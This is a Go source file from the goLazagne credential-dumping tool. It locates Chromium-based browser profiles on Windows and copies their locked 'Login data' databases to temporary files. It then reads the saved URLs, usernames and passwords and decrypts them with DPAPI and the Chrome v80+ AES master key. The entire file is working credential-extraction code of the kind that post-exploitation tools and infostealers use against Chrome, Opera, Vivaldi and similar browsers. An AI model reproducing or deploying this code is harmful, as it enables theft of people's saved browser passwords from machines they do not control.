package browsers

import (
	"database/sql"
	"fmt"
	"github.com/buger/jsonparser"
	"github.com/kerbyj/goLazagne/common"
	"io/ioutil"
	"os"
	"strings"
)

func chromeModuleStart(path string) ([]common.UrlNamePass, bool) {
	if _, err := os.Stat(path + "\\Local State"); err == nil {
		fileWithUserData, err := ioutil.ReadFile(path + "\\Local state")
		if err != nil {
			return nil, false
		}
		profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile")

		var profileNames []string

		//todo delete this piece of... is there a more smartly way?
		jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
			profileNames = append(profileNames, string(key))
			return nil
		}, "info_cache")

		// Create temporary databases for bypass locking
		var temporaryDbNames []string
		for _, profileName := range profileNames {
			dbPath := fmt.Sprintf("%s\\%s\\Login data", path, profileName)
			if _, err := os.Stat(dbPath); err == nil {
				file, _ := ioutil.TempFile(os.TempDir(), "prefix")
				err := common.CopyFile(dbPath, file.Name())
				if err != nil {
					return nil, false
				}
				temporaryDbNames = append(temporaryDbNames, file.Name())
			}
		}

		for _, tmpDB := range temporaryDbNames {
			db, err := sql.Open("sqlite3", tmpDB)
			if err != nil {
				//log.Panic(err.Error())
				return nil, false
			}
			rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
			if err != nil {
				return nil, false
			}
			var actionUrl, username, password string
			var data []common.UrlNamePass

			for rows.Next() {
				rows.Scan(&actionUrl, &username, &password)

				/*
					Chromium browser use default win cryptapi function named "CryptProtectData" for encrypting saved credentials.
					Read about DPAPI for more information.
				*/

				decryptedPassword, errUnprotectData := common.Win32CryptUnprotectData(password, false)

				if errUnprotectData != nil {
					// Chrome v80+ creds extract
					if strings.Contains(path, "\\Google\\Chrome\\User Data") {

						keyFilePath := os.Getenv("USERPROFILE") + "/AppData/Local/Google/Chrome/User Data/Local State"
						masterKey, err := common.GetMasterkey(keyFilePath)
						if err != nil {
							return nil, false
						}

						newVersionPassword, errAesDecrypt := common.DecryptAESPwd([]byte(password), masterKey)
						if errAesDecrypt == nil {
							data = append(data, common.UrlNamePass{
								Url:      actionUrl,
								Username: username,
								Pass:     string(newVersionPassword),
							})
						} else {
							// failed to decrypt password with both methods
							data = append(data, common.UrlNamePass{
								Url:      actionUrl,
								Username: username,
								Pass:     "empty",
							})
						}
					}
				} else {
					data = append(data, common.UrlNamePass{
						Url:      actionUrl,
						Username: username,
						Pass:     string(decryptedPassword),
					})
				}
			}
			os.Remove(tmpDB)
			return data, true
		}
		// remove already used database
	}
	return nil, false
}

var (
	/*
		Paths for more interesting and popular browsers for us
	*/
	chromePathsUserData = []string{
		common.LocalAppData + "\\Google\\Chrome\\User Data", // Google chrome
		common.AppData + "\\Opera Software\\Opera Stable",   // Opera
		// common.LocalAppData + "\\Yandex\\YandexBrowser\\User Data", // Yandex browser
		common.LocalAppData + "\\Vivaldi\\User Data",          // Vivaldi
		common.LocalAppData + "\\CentBrowser\\User Data",      // CentBrowser
		common.LocalAppData + "\\Amigo\\User Data",            // Amigo (RIP)
		common.LocalAppData + "\\Chromium\\User Data",         // Chromium
		common.LocalAppData + "\\Sputnik\\Sputnik\\User Data", // Sputnik
	}
)

/*
	Function used to extract credentials from chromium-based browsers (Google Chrome, Opera, Yandex, Vivaldi, Cent Browser, Amigo, Chromium, Sputnik).
*/
func ChromeExtractDataRun() common.ExtractCredentialsResult {
	var Result common.ExtractCredentialsResult
	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}

	var allCreds []common.UrlNamePass

	for _, ChromePath := range chromePathsUserData {
		if _, err := os.Stat(ChromePath); err == nil {

			var data, success = chromeModuleStart(ChromePath)
			if success && data != nil {
				allCreds = append(allCreds, data...)
			}
		}
	}

	if len(allCreds) == 0 {
		return EmptyResult
	} else {
		Result.Success = true
		return common.ExtractCredentialsResult{
			Success: true,
			Data:    allCreds,
		}
	}
}
